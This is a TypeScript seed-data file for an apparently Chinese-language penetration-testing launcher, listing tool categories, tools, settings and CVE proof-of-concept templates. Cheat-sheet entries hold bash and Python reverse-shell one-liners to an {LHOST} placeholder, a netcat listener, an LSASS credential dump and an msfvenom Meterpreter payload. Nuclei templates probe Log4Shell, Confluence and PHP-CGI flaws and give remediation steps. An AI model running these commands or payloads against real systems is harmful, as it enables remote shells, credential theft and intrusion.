import { Category, Tag, Tool, AppSettings, PocItem, ToolEnvironment } from '../../types';

export const SEED_CATEGORIES: Category[] = [
  // 1. 信息收集
  {
    id: 'cat-1',
    name: '信息收集',
    slug: 'info-gathering',
    description: '子域名枚举、端口探测、空间资产测绘与网络指纹识别',
    icon: 'Radar',
    color: '#38bdf8',
    sortOrder: 1,
    isSystem: true,
    parentId: null,
  },
  {
    id: 'cat-1-1',
    name: '子域名与资产枚举',
    slug: 'subdomains',
    description: 'DNS 爆破、证书透明度日志检索与企业组织资产发现',
    icon: 'Globe',
    color: '#38bdf8',
    sortOrder: 1,
    isSystem: true,
    parentId: 'cat-1',
  },
  {
    id: 'cat-1-2',
    name: '端口与服务探测',
    slug: 'port-services',
    description: '全端口扫描、服务版本指纹研判与存活网络探测',
    icon: 'Radar',
    color: '#38bdf8',
    sortOrder: 2,
    isSystem: true,
    parentId: 'cat-1',
  },
  {
    id: 'cat-1-3',
    name: '指纹识别与空间测绘',
    slug: 'fingerprinting',
    description: 'Web 指纹、CMS 识别与空间搜索引擎接口探测',
    icon: 'Search',
    color: '#38bdf8',
    sortOrder: 3,
    isSystem: true,
    parentId: 'cat-1',
  },

  // 2. Web安全
  {
    id: 'cat-2',
    name: 'Web安全',
    slug: 'web-sec',
    description: '抓包代理、Web漏洞挖掘、SQL注入与API自动化审计',
    icon: 'Globe',
    color: '#10b981',
    sortOrder: 2,
    isSystem: true,
    parentId: null,
  },
  {
    id: 'cat-2-1',
    name: '抓包代理与重放',
    slug: 'proxy-replay',
    description: '中间人代理、流量重放、请求改包与交互式测试',
    icon: 'Shield',
    color: '#10b981',
    sortOrder: 1,
    isSystem: true,
    parentId: 'cat-2',
  },
  {
    id: 'cat-2-2',
    name: '漏洞扫描与审计',
    slug: 'vuln-scanner',
    description: 'Web 应用自动化缺陷扫描、XSS 与未授权检测',
    icon: 'Search',
    color: '#10b981',
    sortOrder: 2,
    isSystem: true,
    parentId: 'cat-2',
  },
  {
    id: 'cat-2-3',
    name: 'SQL注入与数据挖掘',
    slug: 'sqli-injection',
    description: '数据库自动化注入检测、报错脱裤与盲注利用',
    icon: 'Terminal',
    color: '#10b981',
    sortOrder: 3,
    isSystem: true,
    parentId: 'cat-2',
  },

  // 3. 漏洞利用
  {
    id: 'cat-3',
    name: '漏洞利用',
    slug: 'exploit',
    description: 'PoC验证框架、EXP执行终端、权限获取与利用套件',
    icon: 'Zap',
    color: '#f59e0b',
    sortOrder: 3,
    isSystem: true,
    parentId: null,
  },
  {
    id: 'cat-3-1',
    name: 'PoC验证与框架',
    slug: 'poc-framework',
    description: '单点漏洞利用脚本、Nuclei 模板与攻击框架集',
    icon: 'Zap',
    color: '#f59e0b',
    sortOrder: 1,
    isSystem: true,
    parentId: 'cat-3',
  },
  {
    id: 'cat-3-2',
    name: 'Payload生成与投递',
    slug: 'payload-delivery',
    description: 'Shell 发生器、混淆编码器与反弹载荷投递',
    icon: 'FileCode',
    color: '#f59e0b',
    sortOrder: 2,
    isSystem: true,
    parentId: 'cat-3',
  },

  // 4. 逆向分析
  {
    id: 'cat-4',
    name: '逆向分析',
    slug: 'reverse-eng',
    description: '反编译、动态调试、二进制静态审查与恶意代码分析',
    icon: 'Cpu',
    color: '#a855f7',
    sortOrder: 4,
    isSystem: true,
    parentId: null,
  },
  {
    id: 'cat-4-1',
    name: '反编译与反汇编',
    slug: 'decompiler',
    description: 'Ghidra / IDA / Jadx 等静态分析与反编译工具',
    icon: 'Cpu',
    color: '#a855f7',
    sortOrder: 1,
    isSystem: true,
    parentId: 'cat-4',
  },
  {
    id: 'cat-4-2',
    name: '动态调试与内存剖析',
    slug: 'debugger',
    description: 'x64dbg / Frida / 进程注入与内存实时分析',
    icon: 'Activity',
    color: '#a855f7',
    sortOrder: 2,
    isSystem: true,
    parentId: 'cat-4',
  },

  // 5. 密码破解
  {
    id: 'cat-5',
    name: '密码破解',
    slug: 'password',
    description: '哈希识别、字典穷举爆破与凭证恢复工具',
    icon: 'Key',
    color: '#ef4444',
    sortOrder: 5,
    isSystem: true,
    parentId: null,
  },
  {
    id: 'cat-5-1',
    name: '哈希离线破解',
    slug: 'hash-recovery',
    description: 'Hashcat / John the Ripper GPU 高速哈希破解',
    icon: 'Key',
    color: '#ef4444',
    sortOrder: 1,
    isSystem: true,
    parentId: 'cat-5',
  },
  {
    id: 'cat-5-2',
    name: '在线服务爆破',
    slug: 'online-bruteforce',
    description: 'SSH / RDP / FTP / SMB 多协议并发密码穷举',
    icon: 'Lock',
    color: '#ef4444',
    sortOrder: 2,
    isSystem: true,
    parentId: 'cat-5',
  },

  // 6. 流量取证
  {
    id: 'cat-6',
    name: '流量取证',
    slug: 'forensics',
    description: '网络数据包捕获、流量重放、内存取证与日志溯源',
    icon: 'Activity',
    color: '#06b6d4',
    sortOrder: 6,
    isSystem: true,
    parentId: null,
  },
  {
    id: 'cat-6-1',
    name: '网络报文分析',
    slug: 'packet-analysis',
    description: 'Wireshark / PCAP 报文剖析与异常协议检测',
    icon: 'Activity',
    color: '#06b6d4',
    sortOrder: 1,
    isSystem: true,
    parentId: 'cat-6',
  },
  {
    id: 'cat-6-2',
    name: '主机取证与溯源',
    slug: 'host-forensics',
    description: 'Volatility 内存转储、系统日志与证据链固定',
    icon: 'FileText',
    color: '#06b6d4',
    sortOrder: 2,
    isSystem: true,
    parentId: 'cat-6',
  },

  // 7. 权限维持
  {
    id: 'cat-7',
    name: '权限维持',
    slug: 'persistence',
    description: '红队C2基础设施、端口转发、隐蔽隧道与域提权',
    icon: 'ShieldAlert',
    color: '#ec4899',
    sortOrder: 7,
    isSystem: true,
    parentId: null,
  },
  {
    id: 'cat-7-1',
    name: 'C2设施与管理',
    slug: 'c2-framework',
    description: '远控客户端、上线节点控制台与信标管理',
    icon: 'ShieldAlert',
    color: '#ec4899',
    sortOrder: 1,
    isSystem: true,
    parentId: 'cat-7',
  },
  {
    id: 'cat-7-2',
    name: '内网穿透与隧道',
    slug: 'tunnel-proxy',
    description: 'FRP / NPS / 端口转发与加密流量隐蔽出网',
    icon: 'Share2',
    color: '#ec4899',
    sortOrder: 2,
    isSystem: true,
    parentId: 'cat-7',
  },
];

export const SEED_TAGS: Tag[] = [
  { id: 'tag-1', name: 'recon', color: '#38bdf8' },
  { id: 'tag-2', name: 'port-scan', color: '#38bdf8' },
  { id: 'tag-3', name: 'proxy', color: '#10b981' },
  { id: 'tag-4', name: 'sqli', color: '#10b981' },
  { id: 'tag-5', name: 'fuzzing', color: '#10b981' },
  { id: 'tag-6', name: 'poc', color: '#f59e0b' },
  { id: 'tag-7', name: 'c2', color: '#ec4899' },
  { id: 'tag-8', name: 'reversing', color: '#a855f7' },
  { id: 'tag-9', name: 'decompiler', color: '#a855f7' },
  { id: 'tag-10', name: 'hashcat', color: '#ef4444' },
  { id: 'tag-11', name: 'wireshark', color: '#06b6d4' },
  { id: 'tag-12', name: 'pcap', color: '#06b6d4' },
  { id: 'tag-13', name: 'tunnel', color: '#ec4899' },
  { id: 'tag-14', name: 'cheat-sheet', color: '#64748b' },
  { id: 'tag-15', name: 'encoding', color: '#64748b' },
  { id: 'tag-16', name: 'red-team', color: '#ef4444' },
  { id: 'tag-17', name: 'blue-team', color: '#38bdf8' },
  { id: 'tag-18', name: 'osint', color: '#38bdf8' },
  { id: 'tag-19', name: 'reverse-shell', color: '#f59e0b' },
  { id: 'tag-20', name: 'privesc', color: '#ef4444' },
  { id: 'tag-21', name: 'listener', color: '#10b981' },
  { id: 'tag-22', name: 'database', color: '#a855f7' },
  { id: 'tag-23', name: 'malware', color: '#ef4444' },
];

export const SEED_TOOLS: Tool[] = [
  {
    id: 'tool-1',
    name: 'Burp Suite Professional',
    description: '行业标杆级 Web 安全测试抓包与重放交互式代理工具',
    type: 'exe',
    categoryId: 'cat-2',
    subcategoryId: 'cat-2-1',
    tags: ['proxy', 'fuzzing', 'red-team'],
    targetPath: 'C:\\Program Files\\BurpSuitePro\\BurpSuitePro.exe',
    defaultArgs: '',
    workingDir: 'C:\\Program Files\\BurpSuitePro',
    platform: 'windows',
    icon: 'Shield',
    color: '#ff6600',
    isFavorite: true,
    sortOrder: 1,
    usageCount: 142,
    lastUsedAt: new Date(Date.now() - 3600000).toISOString(),
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    notes: '核心常驻工具，日常渗透测试首选代理。',
  },
  {
    id: 'tool-2',
    name: 'Nmap Network Scanner',
    description: '网络探测、主机发现和端口漏洞审计利器',
    type: 'exe',
    categoryId: 'cat-1',
    subcategoryId: 'cat-1-2',
    tags: ['recon', 'port-scan'],
    targetPath: 'C:\\Program Files (x86)\\Nmap\\nmap.exe',
    defaultArgs: '-sV -sC -T4',
    openInTerminal: true,
    platform: 'windows',
    icon: 'Radar',
    color: '#38bdf8',
    isFavorite: true,
    sortOrder: 2,
    usageCount: 98,
    lastUsedAt: new Date(Date.now() - 7200000).toISOString(),
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    notes: '建议常用参数：nmap -p- -sV -sC -T4 -v 目标IP',
  },
  {
    id: 'tool-3',
    name: 'Wireshark',
    description: '世界领先的跨平台网络协议剖析与报文实时抓取取证套件',
    type: 'exe',
    categoryId: 'cat-6',
    subcategoryId: 'cat-6-1',
    tags: ['wireshark', 'pcap', 'blue-team'],
    targetPath: 'C:\\Program Files\\Wireshark\\Wireshark.exe',
    platform: 'windows',
    icon: 'Activity',
    color: '#06b6d4',
    isFavorite: true,
    sortOrder: 3,
    usageCount: 76,
    lastUsedAt: new Date(Date.now() - 18000000).toISOString(),
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  },
  {
    id: 'tool-4',
    name: 'CyberChef',
    description: 'GCHQ 开源瑞士军刀式网络数据编解码、哈希与解密分析台',
    type: 'web',
    categoryId: '',
    subcategoryId: null,
    tags: ['encoding', 'crypto', 'decoding'],
    targetPath: 'https://gchq.github.io/CyberChef/',
    icon: 'Globe',
    color: '#10b981',
    isFavorite: true,
    sortOrder: 4,
    usageCount: 65,
    lastUsedAt: new Date(Date.now() - 86400000).toISOString(),
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    notes: '支持本地纯静态无网络运行，数据不出本地环境。',
  },
  {
    id: 'tool-web-1',
    name: 'RevShells 在线反弹 Shell 生成器',
    description: '全平台常用反弹 Shell 单行命令与编码 Payload 瞬时在线构建器',
    type: 'web',
    categoryId: '',
    subcategoryId: null,
    tags: ['reverse-shell', 'red-team', 'payload'],
    targetPath: 'https://www.revshells.com/',
    icon: 'Globe',
    color: '#38bdf8',
    isFavorite: true,
    sortOrder: 10,
    usageCount: 42,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  },
  {
    id: 'tool-web-2',
    name: 'FOFA 空间资产测绘',
    description: '网络空间测绘检索系统，快速研判全球开放端口与系统指纹',
    type: 'web',
    categoryId: '',
    subcategoryId: null,
    tags: ['recon', 'osint', 'fingerprinting'],
    targetPath: 'https://fofa.info/',
    icon: 'Search',
    color: '#0284c7',
    isFavorite: true,
    sortOrder: 11,
    usageCount: 39,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  },
  {
    id: 'tool-web-3',
    name: 'Exploit-DB 全球漏洞利用库',
    description: 'OffSec 维护的权威 CVE 漏洞公开利用代码与 PoC 检索平台',
    type: 'web',
    categoryId: '',
    subcategoryId: null,
    tags: ['poc', 'exploit', 'database'],
    targetPath: 'https://www.exploit-db.com/',
    icon: 'Globe',
    color: '#ef4444',
    isFavorite: false,
    sortOrder: 12,
    usageCount: 28,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  },
  {
    id: 'tool-web-4',
    name: 'DNSDumpster 拓扑探测',
    description: '在线 DNS 深度侦察、子域名资产映射与网络架构拓扑可视化',
    type: 'web',
    categoryId: '',
    subcategoryId: null,
    tags: ['recon', 'osint'],
    targetPath: 'https://dnsdumpster.com/',
    icon: 'Globe',
    color: '#06b6d4',
    isFavorite: false,
    sortOrder: 13,
    usageCount: 16,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  },
  {
    id: 'tool-web-5',
    name: 'VirusTotal 在线多引擎沙箱',
    description: '聚合全球数十款杀毒引擎的文件、哈希与域名威胁研判分析',
    type: 'web',
    categoryId: '',
    subcategoryId: null,
    tags: ['forensics', 'malware'],
    targetPath: 'https://www.virustotal.com/',
    icon: 'Globe',
    color: '#a855f7',
    isFavorite: false,
    sortOrder: 14,
    usageCount: 31,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  },
  {
    id: 'tool-web-6',
    name: 'GTFOBins 提权速查手册',
    description: '针对 Unix 二进制程序的提权利用与 SUID 逃逸备忘速查站点',
    type: 'web',
    categoryId: '',
    subcategoryId: null,
    tags: ['privesc', 'linux'],
    targetPath: 'https://gtfobins.github.io/',
    icon: 'Globe',
    color: '#f59e0b',
    isFavorite: true,
    sortOrder: 15,
    usageCount: 35,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  },
  {
    id: 'tool-5',
    name: 'SQLmap',
    description: '自动化 SQL 注入检测与数据库接管渗透神器',
    type: 'script',
    categoryId: 'cat-2',
    subcategoryId: 'cat-2-3',
    tags: ['sqli', 'red-team'],
    targetPath: 'C:\\Tools\\sqlmap\\sqlmap.py',
    defaultArgs: '-u "http://target/vuln.php?id=1" --batch',
    openInTerminal: true,
    platform: 'all',
    icon: 'Terminal',
    color: '#ef4444',
    isFavorite: true,
    sortOrder: 5,
    usageCount: 54,
    lastUsedAt: new Date(Date.now() - 172800000).toISOString(),
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  },
  {
    id: 'tool-6',
    name: 'Ghidra',
    description: 'NSA 开源的多架构软件逆向工程分析与反汇编平台',
    type: 'exe',
    categoryId: 'cat-4',
    subcategoryId: 'cat-4-1',
    tags: ['reversing', 'decompiler'],
    targetPath: 'C:\\Tools\\ghidra\\ghidraRun.bat',
    platform: 'windows',
    icon: 'Cpu',
    color: '#a855f7',
    isFavorite: true,
    sortOrder: 6,
    usageCount: 38,
    lastUsedAt: new Date(Date.now() - 259200000).toISOString(),
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  },
  {
    id: 'tool-7',
    name: 'Gobuster',
    description: '用 Go 编写的高性能 URI 目录、DNS 子域与虚拟主机爆破工具',
    type: 'exe',
    categoryId: 'cat-1',
    subcategoryId: 'cat-1-1',
    tags: ['recon', 'fuzzing'],
    targetPath: 'C:\\Tools\\gobuster\\gobuster.exe',
    defaultArgs: 'dir -u http://example.com -w common.txt',
    openInTerminal: true,
    isFavorite: false,
    sortOrder: 7,
    usageCount: 22,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  },
  {
    id: 'tool-8',
    name: 'Hashcat',
    description: '世界上最快且最高效的高级密码与哈希恢复引擎',
    type: 'exe',
    categoryId: 'cat-5',
    subcategoryId: 'cat-5-1',
    tags: ['hashcat'],
    targetPath: 'C:\\Tools\\hashcat\\hashcat.exe',
    defaultArgs: '-m 0 -a 0 target.hash rockyou.txt',
    openInTerminal: true,
    isFavorite: false,
    sortOrder: 8,
    usageCount: 19,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  },
  {
    id: 'tool-9',
    name: 'Bash 标准一键反弹 Shell',
    description: '最经典的 Linux Bash 管道网络交互反弹 Shell 单行指令',
    type: 'cheat_sheet',
    categoryId: '',
    subcategoryId: null,
    tags: ['reverse-shell', 'linux', 'bash'],
    targetPath: 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1',
    icon: 'Bookmark',
    color: '#10b981',
    isFavorite: true,
    sortOrder: 9,
    usageCount: 88,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    notes: '标准 TCP 反弹 Shell，需预先在宿主机配置监听端口。',
  },
  {
    id: 'tool-cs-1',
    name: 'Python3 交互式 PTY 反弹 Shell',
    description: '利用 Python3 socket 与 pty 模块获取全交互式伪终端 Shell',
    type: 'cheat_sheet',
    categoryId: '',
    subcategoryId: null,
    tags: ['reverse-shell', 'python'],
    targetPath: `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`,
    icon: 'Bookmark',
    color: '#f59e0b',
    isFavorite: true,
    sortOrder: 20,
    usageCount: 65,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    notes: '自动分配 PTY 终端，支持 Ctrl+C 与交互式命令补全。',
  },
  {
    id: 'tool-cs-2',
    name: 'Netcat 端口监听挂载',
    description: '在攻击机或中继服务器上拉起 TCP 端口等待反弹节点连接',
    type: 'cheat_sheet',
    categoryId: '',
    subcategoryId: null,
    tags: ['listener', 'netcat'],
    targetPath: 'nc -lvnp {LPORT}',
    icon: 'Bookmark',
    color: '#38bdf8',
    isFavorite: true,
    sortOrder: 21,
    usageCount: 59,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    notes: '参数说明：-l 监听，-v 详细回显，-n 不做DNS解析，-p 指定端口。',
  },
  {
    id: 'tool-cs-3',
    name: 'Linux Sudo 与 SUID 提权枚举',
    description: '快速探测当前账户 Sudo 免密权限与系统高危 SUID 二进制文件',
    type: 'cheat_sheet',
    categoryId: '',
    subcategoryId: null,
    tags: ['privesc', 'linux'],
    targetPath: 'sudo -l 2>/dev/null; echo "=== SUID ==="; find / -perm -u=s -type f 2>/dev/null',
    icon: 'Bookmark',
    color: '#ef4444',
    isFavorite: false,
    sortOrder: 22,
    usageCount: 34,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    notes: '用于本地权限提升前期信息搜集。',
  },
  {
    id: 'tool-cs-4',
    name: 'Windows 导出 LSASS 内存凭据',
    description: '使用微软官方 Sysinternals Procdump 转储 LSASS 进程内存转储',
    type: 'cheat_sheet',
    categoryId: '',
    subcategoryId: null,
    tags: ['windows', 'privesc'],
    targetPath: 'procdump.exe -accepteula -ma lsass.exe lsass.dmp',
    icon: 'Bookmark',
    color: '#ec4899',
    isFavorite: false,
    sortOrder: 23,
    usageCount: 27,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    notes: '需管理员/SYSTEM权限运行，生成的 dmp 文件可用 Mimikatz 离线提取密码。',
  },
  {
    id: 'tool-cs-5',
    name: '常见高危渗透端口对照速查',
    description: '内外网攻防演练常见高危业务服务与默认端口清单速查',
    type: 'cheat_sheet',
    categoryId: '',
    subcategoryId: null,
    tags: ['port-scan', 'recon', 'cheat-sheet'],
    targetPath: '21(FTP), 22(SSH), 23(Telnet), 80/443(Web), 445(SMB), 1433(MSSQL), 1521(Oracle), 3306(MySQL), 3389(RDP), 5432(PostgreSQL), 6379(Redis), 7001(WebLogic), 8080(Tomcat)',
    icon: 'Bookmark',
    color: '#64748b',
    isFavorite: true,
    sortOrder: 24,
    usageCount: 48,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    notes: '涵盖常见未授权访问、弱口令及 RCE 暴露服务端口。',
  },
  {
    id: 'tool-cs-6',
    name: 'MSFVenom 生成 Windows 反弹木马',
    description: '使用 Metasploit msfvenom 一键生成 x64 Meterpreter 可执行载荷',
    type: 'cheat_sheet',
    categoryId: '',
    subcategoryId: null,
    tags: ['poc', 'payload', 'red-team'],
    targetPath: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o payload.exe',
    icon: 'Bookmark',
    color: '#a855f7',
    isFavorite: false,
    sortOrder: 25,
    usageCount: 29,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    notes: '配合 msfconsole 的 exploit/multi/handler 模块接收会话。',
  },
];

export const DEFAULT_SETTINGS: AppSettings = {
  theme: 'dark',
  accentColor: '#38bdf8',
  autoLaunch: false,
  minimizeToTray: true,
  closeToTray: true,
  defaultTerminal: 'wt',
  globalShortcut: 'Alt+Space',
  storageType: 'indexeddb',
  offlineMode: true,
  developerMode: false,
};

export const SEED_POCS: PocItem[] = [
  {
    id: 'poc-1',
    name: 'Apache ActiveMQ OpenWire 反序列化漏洞验证',
    cveId: 'CVE-2023-46604',
    severity: 'critical',
    format: 'nuclei',
    vulnType: 'RCE',
    fofaQuery: 'app="Apache-ActiveMQ" || port="61616"',
    affectedComponent: 'Apache ActiveMQ < 5.15.16 / 5.16.7 / 5.17.6 / 5.18.3',
    description: 'Apache ActiveMQ OpenWire 协议对可实例化类校验不严，远程未授权攻击者可通过 61616 端口发送恶意序列化数据触发远程代码执行。',
    targetPath: 'nuclei -t cves/2023/CVE-2023-46604.yaml -u {TARGET}',
    templateContent: `id: CVE-2023-46604
info:
  name: Apache ActiveMQ - Remote Code Execution
  author: CyberNest Security Team
  severity: critical
  description: Apache ActiveMQ is vulnerable to Remote Code Execution via OpenWire protocol class validation bypass.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-46604
    - https://activemq.apache.org/security-advisories.data/CVE-2023-46604-announcement.txt
  tags: cve,cve2023,activemq,rce,deserialization

tcp:
  - inputs:
      - data: "1f00000000000000000001"
    host:
      - "{{Hostname}}:61616"
    matchers:
      - type: word
        words:
          - "ActiveMQ"
          - "WireFormatInfo"
        condition: and`,
    remediation: '1. 升级 Apache ActiveMQ 至 5.15.16, 5.16.7, 5.17.6, 5.18.3 及以上版本。\n2. 临时限制 61616 端口仅允许内网受信 IP 访问。',
    references: [
      'https://nvd.nist.gov/vuln/detail/CVE-2023-46604',
      'https://activemq.apache.org/security-advisories.data/CVE-2023-46604-announcement.txt'
    ],
    tags: ['rce', 'deserialization', 'activemq', 'critical'],
    author: 'CyberNest SecLab',
    usageCount: 15,
    isFavorite: true,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  },
  {
    id: 'poc-2',
    name: 'Apache Log4j2 JNDI 远程代码执行探测 (Log4Shell)',
    cveId: 'CVE-2021-44228',
    severity: 'critical',
    format: 'nuclei',
    vulnType: 'RCE',
    fofaQuery: 'app="Apache-Log4j2" || body="${jndi:"',
    affectedComponent: 'Apache Log4j 2.0-beta9 ~ 2.14.1',
    description: 'Log4j2 包含基于 JNDI 的 lookup 特性，未对协议及外部请求目标进行有效过滤，攻击者可输入 ${jndi:...} 载荷诱导受害服务器加载恶意类执行任意代码。',
    targetPath: 'nuclei -t cves/2021/CVE-2021-44228.yaml -u {TARGET}',
    templateContent: `id: CVE-2021-44228
info:
  name: Apache Log4j2 - Remote Code Execution (Log4Shell)
  author: CyberNest Security Team
  severity: critical
  description: Apache Log4j2 JNDI features do not protect against attacker-controlled LDAP and other JNDI related endpoints.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  tags: cve,cve2021,rce,log4j,jndi

http:
  - raw:
      - |
        GET /?x=\${jndi:ldap://{{interactsh-url}}/a} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: \${jndi:ldap://{{interactsh-url}}/a}
        X-Forwarded-For: \${jndi:ldap://{{interactsh-url}}/a}

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"`,
    remediation: '1. 升级 Apache Log4j 至 2.17.1 或更高安全版本。\n2. 在 JVM 启动参数中增加 -Dlog4j2.formatMsgNoLookups=true 缓解。',
    references: [
      'https://nvd.nist.gov/vuln/detail/CVE-2021-44228',
      'https://logging.apache.org/log4j/2.x/security.html'
    ],
    tags: ['rce', 'log4j', 'jndi', 'java'],
    author: 'CyberNest SecLab',
    usageCount: 38,
    isFavorite: true,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  },
  {
    id: 'poc-3',
    name: 'Atlassian Confluence 未授权权限绕过验证',
    cveId: 'CVE-2023-22515',
    severity: 'critical',
    format: 'nuclei',
    vulnType: '认证绕过',
    fofaQuery: 'app="Atlassian-Confluence"',
    affectedComponent: 'Confluence Data Center & Server 8.0.0 ~ 8.5.1',
    description: 'Atlassian Confluence Server & Data Center 的 /setup/* 端点存在未授权访问漏洞，外部攻击者无需认证即可触发向导并重置管理员凭据。',
    targetPath: 'nuclei -t cves/2023/CVE-2023-22515.yaml -u {TARGET}',
    templateContent: `id: CVE-2023-22515
info:
  name: Atlassian Confluence - Broken Access Control
  author: CyberNest Security Team
  severity: critical
  description: An unauthenticated attacker could access setup endpoints and create administrative accounts.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-22515
  tags: cve,cve2023,confluence,auth-bypass

http:
  - method: GET
    path:
      - "{{BaseURL}}/setup/setupadministrator.action"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Setup Administrator"
          - "confluence"
        condition: and`,
    remediation: '立即升级 Confluence 至 8.3.3, 8.4.3, 8.5.2, 8.6.1 或更高版本；在反向代理层面阻断对外开放的 /setup/* 路径请求。',
    references: [
      'https://nvd.nist.gov/vuln/detail/CVE-2023-22515',
      'https://confluence.atlassian.com/security/cve-2023-22515-broken-access-control-vulnerability-in-confluence-data-center-and-server-1295682276.html'
    ],
    tags: ['auth-bypass', 'confluence', 'atlassian'],
    author: 'CyberNest SecLab',
    usageCount: 22,
    isFavorite: false,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  },
  {
    id: 'poc-4',
    name: 'Spring Boot Actuator 未授权敏感信息泄露探测',
    cveId: 'CNVD-2019-15860',
    severity: 'medium',
    format: 'http',
    vulnType: '信息泄露',
    fofaQuery: 'icon_hash="116323821" || body="Whitelabel Error Page"',
    affectedComponent: 'Spring Boot Actuator 1.x ~ 2.x',
    description: 'Spring Boot 监控端点配置不当导致 /actuator/env, /heapdump, /trace 未授权暴露，攻击者可直接下载内存快照或读取包含明文密码、数据库连接串的配置信息。',
    targetPath: 'curl -i -s {TARGET}/actuator/env',
    templateContent: `GET /actuator/env HTTP/1.1
Host: {{TARGET}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) CyberNest/1.0
Accept: application/json, text/plain, */*

---
响应判定特征:
HTTP/1.1 200 OK
Content-Type: application/vnd.spring-boot.actuator.v2+json

若返回包包含 "propertySources" 或 "activeProfiles"，说明敏感端点处于开放状态。`,
    remediation: '在 application.properties 中配置：management.endpoints.web.exposure.exclude=*，或集成 Spring Security 开启强认证。',
    references: [
      'https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html'
    ],
    tags: ['info-leak', 'springboot', 'actuator', 'java'],
    author: 'CyberNest SecLab',
    usageCount: 45,
    isFavorite: true,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  },
  {
    id: 'poc-5',
    name: 'PHP-CGI Windows 远程代码执行漏洞探测',
    cveId: 'CVE-2024-4577',
    severity: 'high',
    format: 'nuclei',
    vulnType: 'RCE',
    fofaQuery: 'app="PHP" && os="windows"',
    affectedComponent: 'PHP 8.1 < 8.1.29, 8.2 < 8.2.20, 8.3 < 8.3.8 on Windows',
    description: 'Windows 平台下 PHP-CGI 模块字符编码转换（Best-Fit 特性）存在安全缺陷，攻击者可绕过 CVE-2012-1823 参数保护机制，向 PHP 解释器注入命令行选项。',
    targetPath: 'nuclei -t cves/2024/CVE-2024-4577.yaml -u {TARGET}',
    templateContent: `id: CVE-2024-4577
info:
  name: PHP-CGI - Windows Remote Code Execution
  author: CyberNest Security Team
  severity: high
  description: PHP-CGI argument injection vulnerability on Windows due to Best-Fit encoding character mapping.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-4577
  tags: cve,cve2024,php,cgi,rce,windows

http:
  - method: POST
    path:
      - "{{BaseURL}}/test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "<?php echo 'CYBERNEST_VULN_VERIFIED'; phpinfo(); ?>"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "CYBERNEST_VULN_VERIFIED"
          - "PHP Version"
        condition: and`,
    remediation: '1. 升级 PHP 至 8.1.29, 8.2.20, 8.3.8 及以上版本。\n2. 避免以 CGI 暴露运行，改用 FastCGI 或专用应用容器托管。',
    references: [
      'https://nvd.nist.gov/vuln/detail/CVE-2024-4577',
      'https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/'
    ],
    tags: ['rce', 'php', 'windows', 'cve2024'],
    author: 'CyberNest SecLab',
    usageCount: 19,
    isFavorite: false,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  }
];

export const SEED_ENVIRONMENTS: ToolEnvironment[] = [
  {
    id: 'env-java-8',
    name: 'Java 8 (旧版安全工具运行环境)',
    type: 'java',
    binPath: 'java',
    extraArgs: '-Xmx2g -Dfile.encoding=UTF-8',
    envVars: {},
    description: '适用于 Ysoserial、老版本 Burp 插件、Weblogic/Shiro 反序列化等历史 Java 8 工具',
    isDefault: true,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  },
  {
    id: 'env-java-17',
    name: 'Java 17 / 21 (现代 Java 安全运行时)',
    type: 'java',
    binPath: 'java',
    extraArgs: '-Xmx4g --add-opens=java.base/java.lang=ALL-UNNAMED',
    envVars: {},
    description: '适用于新版 Burp Suite、Ghidra、Caido 及高版本 Spring 安全验证工具',
    isDefault: false,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  },
  {
    id: 'env-python-3',
    name: 'Python 3.x (主流渗透测试与脚本环境)',
    type: 'python',
    binPath: 'python',
    extraArgs: '-u',
    envVars: {
      PYTHONIOENCODING: 'utf-8',
    },
